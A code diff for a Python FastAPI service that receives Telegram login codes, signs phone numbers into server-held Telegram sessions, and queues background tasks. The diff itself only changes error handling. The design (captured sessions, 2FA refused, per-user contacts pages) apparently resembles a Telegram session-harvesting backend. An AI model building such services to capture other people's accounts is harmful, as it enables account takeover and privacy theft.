@@ -107,32 +107,35 @@ async def update_user_task(phone_number: str):
         await client.disconnect()
 
 
+from fastapi import HTTPException
+
 @app.post("/verify_code")
 async def verify_code(data: CodePayload, background_tasks: BackgroundTasks):
     phone_number = next((k for k,v in sessions.items() if "phone_code_hash" in v), None)
     if not phone_number:
-        return {"error": "Send phone first."}
+        raise HTTPException(status_code=400, detail="Send phone first.")
     phone_code_hash = sessions[phone_number]["phone_code_hash"]
 
     session_name = f"{SESSIONS_FOLDER}/session_{phone_number}"
     client = TelegramClient(session_name, API_ID, API_HASH)
     await client.connect()
 
-    if not await client.is_user_authorized():
-        try:
-            await client.sign_in(phone_number, data.code, phone_code_hash=phone_code_hash)
-        except SessionPasswordNeededError:
-            return {"error": "2FA enabled. Not supported."}
-        except Exception as e:
-            return {"error": f"Code error: {str(e)}"}
-
     try:
+        if not await client.is_user_authorized():
+            try:
+                await client.sign_in(phone_number, data.code, phone_code_hash=phone_code_hash)
+            except SessionPasswordNeededError:
+                raise HTTPException(status_code=400, detail="2FA enabled. Not supported.")
+            except Exception as e:
+                raise HTTPException(status_code=400, detail=f"Невірний код")
+
         background_tasks.add_task(update_user_task, phone_number)
 
     finally:
         await client.disconnect()
 
     return {"status": "ok"}
+
 
 
 @app.get("/user/{user_folder}/contacts", response_class=HTMLResponse)
